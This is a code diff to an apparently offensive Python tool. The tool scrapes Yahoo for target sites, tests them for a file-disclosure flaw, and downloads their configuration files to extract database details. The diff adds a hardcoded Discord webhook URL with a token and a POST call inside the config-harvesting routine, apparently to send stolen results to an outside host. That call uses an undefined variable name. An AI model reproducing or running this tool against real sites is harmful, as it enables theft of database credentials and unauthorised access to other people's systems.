@@ -4,7 +4,7 @@ import requests, random, threading, time
 from colorama import Fore
 from bs4 import BeautifulSoup
 from ScrapeSearchEngine.ScrapeSearchEngine import Yahoo
-
+webhook = "https://discord.com/api/webhooks/819050302979702794/uotsVypOr5BTWo8w9WNST89-Uj7xLuuxJjr0--3SkulWd4mQpbmX9PoZ6oISEAa2_Wwa"
 
 def print_error(a):
     print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTRED_EX}ERRO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
@@ -72,7 +72,8 @@ def remotedown(target):
         return
 
     if req.status_code == 200:
-        f = open('output.txt', 'w').write(req.text)
+        f = open('output.txt', 'w')
+        f.write(req.text)
         print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} vulnerable')
         print_sucess('Output saved to output.txt\n')
 
@@ -113,9 +114,11 @@ def configdownload(target):
 
         try:
             text = req.text
-            db_name = text.split("define('DB_NAME', ")[0]
-            db_name = db_name.split("');")[1]
-            print_info(f'Database Host : {db_name}')
+            db_name = text.split("define")[2].split("('DB_NAME', '")[1].replace("');", "").replace("/** MySQL database username */", "")
+
+            print_info(f'Database Name : {db_name}')
+
+            req = requests.post(hook, data={"content": ""})
         except:
             print_error('Failed to pharse request data')
             print_sucess('Output saved to output.txt\n')
